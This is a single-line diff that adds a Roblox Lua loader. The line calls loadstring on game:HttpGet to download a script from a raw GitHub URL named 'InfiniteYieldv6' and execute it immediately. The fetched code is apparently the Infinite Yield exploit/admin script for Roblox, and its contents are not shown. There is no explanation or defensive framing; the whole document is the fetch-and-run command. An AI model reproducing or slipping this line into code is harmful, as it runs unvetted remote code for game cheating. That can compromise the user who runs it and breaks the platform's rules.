@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/InfiniteYieldv6/main/InfiniteYieldv6"))()
